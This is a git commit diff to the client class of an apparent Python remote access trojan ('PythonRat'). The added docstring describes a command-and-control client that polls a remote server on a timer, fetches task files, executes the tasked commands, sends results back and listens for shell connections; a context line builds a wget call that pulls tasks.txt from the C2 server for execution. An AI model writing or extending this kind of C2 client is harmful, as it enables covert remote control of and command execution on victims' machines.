89b0017ad8e9db7f79334f9c1cad042322982ccf
mattman059 <mattman059@gmail.com>
2022-03-02 19:45:49 -0600

    Update client_class.py

--- PythonRat/client_class.py
+++ PythonRat/client_class.py
@@ -4,6 +4,68 @@ import os.path
 import capabilities
 
 class Client:
+    """
+    A class to represent a Commaand & Control (C2) Client
+
+    Attributes
+    ----------
+
+    ADDR : str
+        String representation of the desired interface to listen on
+    COMMS_PORT : int
+        Integer representation of the desired port number to listen on
+    SERVER : str
+        String representation of the remote server IP address : "127.0.0.1"
+    SRV_PORT : int
+        Integer representation of the remote server port number
+    WEB_PORT : int (Optional)
+        Optional integer representation of the remote server web port 
+        Defaults to TCP/8000
+    MAX_TIMER : int (Optional)
+        Optional integer representation of the connection frequency.
+        After MAX_TIMER seconds, the client will initiate a connection to
+        the server to check for tasking.
+        Defaults to 120 seconds (2 minutes)
+
+    Methods
+    -------
+
+    check_tasking()
+    Parameters
+    ----------
+    None.
+    Client issues a web request to server checking for tasking and writes it out to a file
+
+    comms_thread()
+    Parameters
+    ----------
+    None.
+    Client listens and accepts connections on self.PORT for shell connectivity.
+    Client executes tasked commands.
+
+    exec_tasking()
+    Parameters
+    ----------
+    None.
+    Client reads the stored tasks and executes them, writing the results to a file
+
+    send_results()
+    Parameters
+    ----------
+    None.
+    Client connects to remote C2 Server and sends stored task results
+
+    tasking_thread()
+    Parameters
+    ----------
+    None.
+    Client executes the following loop:
+     - Check Tasking
+     - Execute Tasking
+     - Send Results
+    Following this, the client sleeps for MAX_TIMER seconds
+    """
+
     def __init__(self,ADDR,COMMS_PORT,SERVER,SRV_PORT,WEB_PORT=8000,MAX_TIMER=120):
         self.ADDR = ADDR
         self.COMMS_PORT = COMMS_PORT
@@ -12,7 +74,6 @@ class Client:
         self.SRV_PORT = SRV_PORT
         self.WEB_PORT = WEB_PORT
     
-
     def check_tasking(self):
         task_file_command = f"wget http://{self.SERVER}:{self.WEB_PORT}/tasks.txt -O ./tasks-grabbed.txt"
         capabilities.run(task_file_command)
